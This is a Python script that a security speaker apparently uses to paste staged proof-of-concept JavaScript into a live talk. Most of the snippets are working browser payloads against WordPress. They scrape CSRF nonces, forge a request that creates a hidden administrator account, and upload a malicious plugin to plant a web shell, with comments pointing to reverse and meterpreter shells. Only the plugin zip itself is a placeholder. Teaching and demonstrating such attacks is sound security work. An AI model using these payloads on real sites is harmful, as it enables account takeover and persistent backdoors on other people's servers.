#!/bin/python
#
#
# Simple script to copy blocks of code (e.g. functions)
# to the clip board when a number is entered (1, 2, 3)
# For demos where I'm building up code over time
# This script will copy the right code into the clipboard
# when I need it with minimal distrction from the talk
#
# This will put the code into the middle mouse button past
# buffer
#
# Drew Kirkpatrick
# drew.kirkpatrick@gmail.com
# @hoodoer
#

import os



# So this is terrible. Hopefully no
# one ever looks at this code. 
def copyToClipboard(code):
	f = open("./tempFile.txt", "w+")

	f.write(code)
	f.close()

	cmd = "xclip -i ./tempFile.txt"
	os.system(cmd)



# First demo code, 
# simple alert popup
def one():
	code = """
function helloWorld()
{
	alert("Hello world!");
}
	"""

	copyToClipboard(code)

	return "Hello world code ready..."







# First version of add user, missing the nonce
def two():
	code = """
function addAdminUser()
{
	var uri = "/wp-admin/user-new.php";

	// The following user will be added as an Administrator level user
	var username  = "sleevelessCyberBandits";
	var email     = "advancedadmin%40bad.af"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri);

 	xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	var body = "action=createuser&"
	body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
	body += "user_login=" + username + "&";
	body += "email=" + email + "&";
	body += "first_name=" + firstName + "&";
	body += "last_name=" + lastName + "&";
	body += "uri=&";
	body += "pass1=" + password + "&";
	body += "pass1-text=" + password + "&";
	body += "pass2=" + password + "&";
	body += "pw_weak=on&";
	body += "send_user_notification=0&";
	body += "role=subscriber&";
	body += "ure_select_other_roles=administrator&"; // muahahahaha 
	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
	body += "createuser=Add+New+User";

	xhr.send(body);
}	
	"""

	copyToClipboard(code)

	return "Add Admin User v1 ready..."



# Code to find "add user" nonce
def three():
	code = """
function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}



// Parse out the nonce value then pass to the add user function
function addAdminUser()
{
	var uri = "/wp-admin/user-new.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
			var nonceVal = response.substring(noncePos+35, noncePos+45);

			console.log("Our nonce is: " + nonceVal);
		}
	}
}
	"""

	copyToClipboard(code)

	return "Nonce huntin' code ready..."




# Woohoo! Working admin user!
def four():
	code = """
// Parse out the nonce value then pass to the add user function
function addAdminUser()
{
	var uri = "/wp-admin/user-new.php";

	// The following user will be added as an Administrator level user
	var username  = "sleevelessCyberBandits";
	var email     = "advancedadmin%40bad.af"
	var firstName = "trevor";
	var lastName  = "roach";
	var password  = "toor";



	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce_create-user" value="');
			var nonceVal = response.substring(noncePos+35, noncePos+45);

			xhr = new XMLHttpRequest();
			xhr.open("POST", uri);

 			xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

			var body = "action=createuser&"
			body += "_wpnonce_create-user=" + nonceVal + "&"; 
			body += "_wp_http_referer=%2Fwp-admin%2Fuser-new.php&"
			body += "user_login=" + username + "&";
			body += "email=" + email + "&";
			body += "first_name=" + firstName + "&";
			body += "last_name=" + lastName + "&";
			body += "uri=&";
			body += "pass1=" + password + "&";
			body += "pass1-text=" + password + "&";
			body += "pass2=" + password + "&";
			body += "pw_weak=on&";
			body += "send_user_notification=0&";
			body += "role=subscriber&";
			body += "ure_select_other_roles=administrator&"; // muahahahaha 
			body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
			body += "createuser=Add+New+User";

			xhr.send(body);
		}
	}
}
	"""

	copyToClipboard(code)

	return "Happy Add Admin User v2 yummyness ready..."




# Find the plugin nonce, nothing else yet
def five():
	code = """
// Get the nonce required for adding a new plugin
// and upload the malicious plugin. Then you can use
// the yertle.py script to execute actions such
// as starting a reverse shell, or popping a php
// meterpreter shell
function installYertleShell()
{
	console.log("Starting add plugin, hunting for the nonce...");

		// console.log("Starting getNonce...");
	var uri = "/wp-admin/plugin-install.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+23, noncePos+33);
			console.log("Nonce value: " + nonceVal);
		}
	}
}
	"""

	copyToClipboard(code)

	return "Get add plugin nonce ready..."



# Phewww this is a lot. And it's missing the actual binary
# and parsing of installation directory
def six():
	code = """
var webShellPath    = "shell/shell.php";


function installYertleShell()
{
	console.log("Starting add plugin, hunting for the nonce...");

		// console.log("Starting getNonce...");
	var uri = "/wp-admin/plugin-install.php";

	xhr = new XMLHttpRequest();

	xhr.open("GET", uri, true);
	xhr.send(null);


	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			var response = read_body(xhr);
			var noncePos = response.indexOf('name="_wpnonce" value="');
			console.log("Nonce position: " + noncePos);

			var nonceVal = response.substring(noncePos+23, noncePos+33);
			console.log("Nonce substring: " + nonceVal);

			// Now we have the nonce, we need to add the plugin....


			// This data buffer should be your 
			// PHP plugin zip file. 
			var pluginZipFile = '\x41\x42\x43';


			var fileSize = pluginZipFile.length;

			var boundary = "---------------------------82520842616842250352141452311";

			var uploadURI = "/wp-admin/update.php?action=upload-plugin";

			uploadXhr = new XMLHttpRequest();
			uploadXhr.open("POST", uploadURI, true);

			uploadXhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
			uploadXhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
			uploadXhr.setRequestHeader("Upgrade-Insecure-Requests", "1");

			var body = "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\r\n\r\n';
			body += nonceVal + "\r\n"; 

			body += "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\r\n\r\n";
			body += "/wp-admin/plugin-install.php" + "\r\n";


			body += "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\r\n";
			body += "Content-Type: application/zip" + "\r\n\r\n";
			body += pluginZipFile + "\r\n";

			body += "--" + boundary + "\r\n";
			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\r\n\r\n";
			body += "Install Now" + "\r\n";
			body += boundary + "--\r\n\r\n";

			var aBody = new Uint8Array(body.length);
			for (var i = 0; i < aBody.length; i++)
			{
				aBody[i] = body.charCodeAt(i);
			}
			uploadXhr.send(new Blob([aBody]));

			console.log("Done uploading malicious plugin");
		}
	}
}
	"""

	copyToClipboard(code)

	return "Hollowed out add plugin ready..."





def gimmeOuttaHere():
	exit()
	





def handleInput(input):
	switcher = {
        1: one,
        2: two,
        3: three,
        4: four,
        5: five,
        6: six,
        exit: gimmeOuttaHere,
        quit: gimmeOuttaHere
	}

	# Get the function from switcher dictionary
	func = switcher.get(input, lambda: "Invalid Input")
    # Execute the function
	print func()
	print


def main():
	print "Demo code DJ ready to serve up some wonky POCs baby"


	while True:
		userInput = input("So whatcha want? ")
		handleInput(userInput)
		


if __name__ == "__main__":
    main()
